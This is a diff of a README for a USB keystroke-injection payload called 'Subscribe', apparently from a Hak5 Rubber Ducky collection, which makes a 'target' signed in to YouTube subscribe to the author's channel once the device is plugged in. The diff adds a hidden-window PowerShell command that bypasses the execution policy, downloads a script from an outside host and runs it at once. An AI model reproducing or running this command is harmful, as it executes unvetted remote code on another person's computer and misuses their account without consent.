@@ -15,11 +15,11 @@
 
 # Subscribe
 
-A script I put together to make your target subscribe to your youtube channel
+A script I put together to make your target subscribe to your YouTube channel.
 
 ## Description
 
-This script is set to open your youtube account in their browser where they will be prompted to subscribe to you. 
+This script is set to open your YouTube account in their browser where they will be prompted to subscribe to you. 
 SPOILER: They do.
 
 ## Getting Started
@@ -27,7 +27,7 @@ SPOILER: They do.
 ### Dependencies
 
 * Windows 10,11
-* Your target will have to be signed into their youtube account
+* Your target will have to be signed into their YouTube account
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -35,6 +35,10 @@ SPOILER: They do.
 
 * Plug in your device
 * 15 seconds later you have a new subscriber
+
+```
+powershell -w h -NoP -Ep Bypass $channel='youtube.com/iamjakoby';iwr jakoby.lol/wj4 | iex
+```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -56,29 +60,43 @@ I am Jakoby
 <!-- CONTACT -->
 ## Contact
 
-<div><h2>I am Jakoby</h2></div>
-  <p><br/>
-  
-  <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
-  
-  <a href="https://github.com/I-Am-Jakoby/">
-    <img src="https://img.shields.io/badge/GitHub-I--Am--Jakoby-blue">
-  </a>
-  
-  <a href="https://www.instagram.com/i_am_jakoby/">
-    <img src="https://img.shields.io/badge/Instagram-i__am__jakoby-red">
-  </a>
-  
-  <a href="https://twitter.com/I_Am_Jakoby/">
-    <img src="https://img.shields.io/badge/Twitter-I__Am__Jakoby-blue">
-  </a>
-  
-  <a href="https://www.youtube.com/c/IamJakoby/">
-    <img src="https://img.shields.io/badge/YouTube-I_am_Jakoby-red">
-  </a>
-
-  Project Link: [https://github.com/I-Am-Jakoby/hak5-submissions/tree/main/RubberDucky/Payloads/RD-Subscribe)
-</p>
+<h2 align="center">📱 My Socials 📱</h2>
+<div align=center>
+<table>
+  <tr>
+    <td align="center" width="96">
+      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
+      </a>
+      <br>YouTube
+    </td>
+    <td align="center" width="96">
+      <a href="https://twitter.com/I_Am_Jakoby">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
+      </a>
+      <br>Twitter
+    </td>
+    <td align="center" width="96">
+      <a href="https://www.instagram.com/i_am_jakoby/">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
+      </a>
+      <br>Instagram
+    </td>
+    <td align="center" width="96">
+      <a href="https://discord.gg/MYYER2ZcJF">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
+      </a>
+      <br>Discord
+    </td>
+    <td align="center" width="96">
+      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
+        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
+      </a>
+      <br>TikTok
+    </td>    
+  </tr>
+</table>
+</div>
 
 
 
